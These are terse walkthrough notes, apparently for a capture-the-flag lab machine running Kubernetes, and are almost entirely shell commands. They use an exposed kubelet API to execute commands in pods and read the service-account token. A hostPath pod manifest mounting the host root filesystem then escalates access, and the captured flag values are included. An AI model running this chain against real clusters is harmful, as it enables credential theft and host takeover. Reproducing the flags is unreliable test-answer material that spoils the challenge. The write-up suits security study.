ping 10.10.11.133
whatweb 10.10.11.133 -> return error

echo "10.10.11.133 steamcloud.htb" >> /etc/hosts

nmap steamcloud.htb
nmap -sCV -O steamcloud.htb
nmap steamcloud.htb -p- -min-rate 10000 -> etcd -> kubernetes
ports 10250 and 8443 are Kubernetes API

dirsearch -u https://steamcloud.htb:10250 -> find /logs
inside logs -> pods -> kubernetes

intall kubeletctl (https://github.com/cyberark/kubeletctl)
kubeletctl -s steamcloud.htb pods

kubeletctl -s steamcloud.htb exec "id" -p nginx -c nginx
kubeletctl -s steamcloud.htb exec "ls /root" -p nginx -c nginx
kubeletctl -s steamcloud.htb exec "cat /root/user.txt" -p nginx -c nginx -> get flag (7a44160d665305eacb266895a39e62c1)

kubeletctl -s steamcloud.htb exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
kubeletctl -s steamcloud.htb exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
kubeletctl -s steamcloud.htb exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token

export token=$(kubeletctl -s steamcloud.htb exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)

install kubectl (https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)

kubectl -s https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod
kubectl -s https:10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list -> take a look on get, create and list permissions

kubectl -s https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod nginx -o yaml -> take a look on namespace (default) and image (nginx:1.14.2)

nano root-pod.yaml
-----------------------------------------------------------------------
apiVersion: v1 
kind: Pod
metadata:
  name: root-pod
  namespace: default
spec:
  containers:
  - name: root-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: root
  volumes:
  - name: root
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
-----------------------------------------------------------------------

kubectl -s https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f root-pod.yaml 
kubectl -s https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod -> check created pod
kubeletctl -s steamcloud.htb pods

kubeletctl -s steamcloud.htb exec "id" -p root-pod -c root-pod
kubeletctl -s steamcloud.htb exec "cat /mnt/root/root.txt" -p root-pod -c root-pod -> get flag (024d0435482f550d429854c9259f21cc)